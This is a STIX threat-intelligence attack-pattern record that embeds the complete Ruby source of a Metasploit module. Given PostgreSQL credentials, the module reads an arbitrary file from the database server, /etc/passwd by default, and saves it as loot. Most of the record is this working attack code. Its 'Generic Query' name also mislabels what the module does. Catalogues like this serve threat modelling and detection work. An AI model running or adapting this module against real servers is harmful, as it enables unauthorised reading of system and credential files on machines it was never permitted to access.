{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--15707eed-76d2-40b8-8e56-d2bfcfca4a5c",
    "created": "2024-08-14T16:24:23.763588Z",
    "modified": "2024-08-14T16:24:23.763592Z",
    "name": "PostgreSQL Server Generic Query",
    "description": " This module imports a file local on the PostgreSQL Server into a temporary table, reads it, and then drops the temporary table. It requires PostgreSQL credentials with table CREATE privileges as well as read privileges to the target file. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/postgres/postgres_readfile.rb",
            "external_id": "postgres_readfile.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Postgres\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PostgreSQL Server Generic Query',\n      'Description'    => %q{\n          This module imports a file local on the PostgreSQL Server into a\n          temporary table, reads it, and then drops the temporary table.\n          It requires PostgreSQL credentials with table CREATE privileges\n          as well as read privileges to the target file.\n      },\n      'Author'         => [ 'todb' ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptString.new('RFILE', [ true, 'The remote file', '/etc/passwd'])\n      ])\n\n    deregister_options( 'SQL', 'RETURN_ROWSET' )\n  end\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def run\n    ret = postgres_read_textfile(datastore['RFILE'])\n    case ret.keys[0]\n    when :conn_error\n      print_error \"#{rhost}:#{rport} Postgres - Authentication failure, could not connect.\"\n    when :sql_error\n      case ret[:sql_error]\n      when /^C58P01/\n        print_error \"#{rhost}:#{rport} Postgres - No such file or directory.\"\n        vprint_status \"#{rhost}:#{rport} Postgres - #{ret[:sql_error]}\"\n      when /^C42501/\n        print_error \"#{rhost}:#{rport} Postgres - Insufficent file permissions.\"\n        vprint_status \"#{rhost}:#{rport} Postgres - #{ret[:sql_error]}\"\n      else\n        print_error \"#{rhost}:#{rport} Postgres - #{ret[:sql_error]}\"\n      end\n    when :complete\n      loot = ''\n      ret[:complete].rows.each { |row|\n        print_line(row.first)\n        loot << row.first\n      }\n      # No idea what the actual ctype will be, text/plain is just a guess\n      path = store_loot('postgres.file', 'text/plain', rhost, loot, datastore['RFILE'])\n      print_good(\"#{rhost}:#{rport} Postgres - #{datastore['RFILE']} saved in #{path}\")\n      vprint_good  \"#{rhost}:#{rport} Postgres - Command complete.\"\n    end\n    postgres_logout if self.postgres_conn\n  end\nend\n"
}